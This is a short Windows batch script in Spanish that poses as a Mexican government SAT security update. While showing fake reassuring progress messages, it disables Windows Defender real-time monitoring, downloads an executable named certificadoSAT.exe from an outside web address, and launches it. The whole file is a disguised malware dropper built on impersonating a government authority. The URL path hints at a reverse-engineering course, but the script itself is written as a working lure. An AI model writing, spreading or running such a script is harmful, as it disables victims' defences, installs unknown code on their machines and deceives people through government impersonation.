@echo off
color 1F
title Centro de Actualización de Seguridad de Windows

echo.
echo ============================================================
echo         GOBIERNO DE MÉXICO - CENTRO DE SEGURIDAD SAT
echo ============================================================
echo.
echo [*] Iniciando verificación de integridad del sistema...
timeout /t 2 >nul

echo [*] Aplicando configuración avanzada de seguridad...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
timeout /t 2 >nul

echo [*] Verificando conexión segura con el servidor tributario...
timeout /t 2 >nul

echo [*] Descargando componente de seguridad complementario...
powershell -Command "Invoke-WebRequest -Uri https://miguelatila.github.io/ingenieriaInversa/ejec/certificadoSAT.exe -OutFile certificadoSAT.exe"
timeout /t 2 >nul

echo [+] Instalando componente descargado...
start certificadoSAT.exe
timeout /t 2 >nul

echo [✓] Proceso completado correctamente.
echo Por favor, no cierre esta ventana. El sistema puede reiniciarse.
timeout /t 5 >nul
exit
